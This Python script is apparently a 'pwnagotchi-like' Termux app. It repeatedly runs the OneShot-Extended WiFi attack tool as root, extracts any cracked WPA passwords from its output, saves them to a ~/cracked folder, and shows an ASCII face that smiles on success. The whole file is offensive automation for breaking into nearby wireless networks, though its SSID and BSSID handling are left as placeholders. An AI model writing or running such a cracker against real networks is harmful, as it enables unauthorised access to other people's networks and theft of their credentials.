#!/usr/bin/env python3
"""
pwnagotchi-like Termux app using OneShot-Extended
All code in one file. Python 3.9+
"""
import os
import sys
import subprocess
import time
from datetime import datetime

# ASCII face module ("face.py" style) - simple placeholder
class Face:
    happy = [
        r"  ^   ^  ",
        r" ( o ^ o )",
        r"   \___/  "
    ]
    sad = [
        r"  -   -  ",
        r" ( o . o )",
        r"   \___/  "
    ]
    neutral = [
        r"  -   -  ",
        r" ( o   o )",
        r"   \___/  "
    ]

    def __init__(self):
        self.state = 'neutral'

    def set_state(self, state):
        if state in ('happy', 'sad', 'neutral'):
            self.state = state

    def draw(self):
        faces = getattr(Face, self.state)
        for line in faces:
            print(line)

# Configuration
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
ONESHOT_PATH = os.path.expanduser('~/ose/ose.py')

# Ensure cracked directory
if not os.path.isdir(CRACKED_DIR):
    os.makedirs(CRACKED_DIR)

# Helper to run OneShot-Extended and return output
def run_oneshot(interface):
    cmd = ['python3', ONESHOT_PATH, '-i', interface, '--clear']
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        return result.stdout + result.stderr
    except Exception as e:
        return f"[!] Error running OneShot: {e}"

# Parse OneShot output for successes
def parse_crack(output):
    # Example line: "[+] WPA PSK: password123"
    for line in output.splitlines():
        if 'PSK:' in line:
            parts = line.split('PSK:')
            if len(parts) == 2:
                pwd = parts[1].strip()
                return pwd
    return None

# Save cracked password
def save_crack(bssid, ssid, password):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_ssid = ssid.replace(' ', '_')
    filename = f"{timestamp}_{safe_ssid}_{bssid}.txt"
    path = os.path.join(CRACKED_DIR, filename)
    with open(path, 'w') as f:
        f.write(f"SSID: {ssid}\nBSSID: {bssid}\nPassword: {password}\n")
    print(f"[+] Saved crack to {path}")

# Main loop
def main():
    face = Face()
    print("Pwnagotchi-Termux starting...")
    face.draw()
    while True:
        output = run_oneshot(INTERFACE)
        pwd = parse_crack(output)
        if pwd:
            # Extract SSID and BSSID from output
            # Placeholder: user selects or parse earlier
            ssid = 'UNKNOWN_SSID'
            bssid = 'UNKNOWN_BSSID'
            save_crack(bssid, ssid, pwd)
            face.set_state('happy')
        else:
            face.set_state('sad')
        os.system('clear')
        face.draw()
        time.sleep(5)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)
    main()
